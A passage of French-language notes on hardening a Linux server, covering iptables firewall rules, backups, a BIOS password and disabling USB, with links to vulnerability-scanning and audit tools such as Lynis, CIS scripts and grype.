	  --> Ce qui sort du serveur (OUTPUT) via l'interface ETH0 avec le protocole TCP et le port de SORTIE 22 on l'accepte

	- `iptables -P INPUT DROP`
	  --> Tout ce qui rentre pas dans les critères on le drop

- Mettre en place les backups

- Mot de passe dans le Bios
 
- Désactiver l'USB

- [AutoPWN](https://github.com/GamehunterKaan/AutoPWN-Suite) --> script qui détecte les vulnérabilités
- [SecureWeb](https://doubletake.fr/securiser-simplement-son-serveur.html) --> Guide de sécurisation

- Script [CIS](https://github.com/ovh/debian-cis) ou [Lynis](https://github.com/CISOfy/Lynis)

- Script hardening confidentialité --> https://privacy.sexy/

- Analyser des dockers en vulnérabilité --> https://github.com/anchore/grype
